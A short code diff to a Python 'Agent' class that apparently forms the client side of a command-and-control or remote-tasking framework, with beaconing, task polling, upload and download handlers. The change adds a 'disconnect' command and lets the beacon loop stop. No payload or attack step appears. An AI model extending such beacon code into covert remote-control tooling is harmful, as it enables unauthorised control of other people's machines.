@@ -23,6 +23,7 @@ class Agent:
             "health": self.handle_health,
             "upload": self.handle_upload,
             "download": self.handle_download,
+            "disconnect": self.handle_disconnect
         }
 
     def rpc(self, method, **params):
@@ -115,6 +116,10 @@ class Agent:
             }),
             exit_code = 0
         )
+    
+    def handle_disconnect(self, params):
+        self._running = False
+        return self.result(stdout="disconnecting")
 
     def identify(self):
         result = self.rpc(
@@ -182,10 +187,10 @@ class Agent:
 
             time.sleep(5)
                
+        self._running = True
         print(f"[+] identified as {self.client_id}") # DEBUG
-        backoff = 1
 
-        while True:
+        while self._running:
             try:
                 result = self.beacon()
                 if result and result.get("task"):
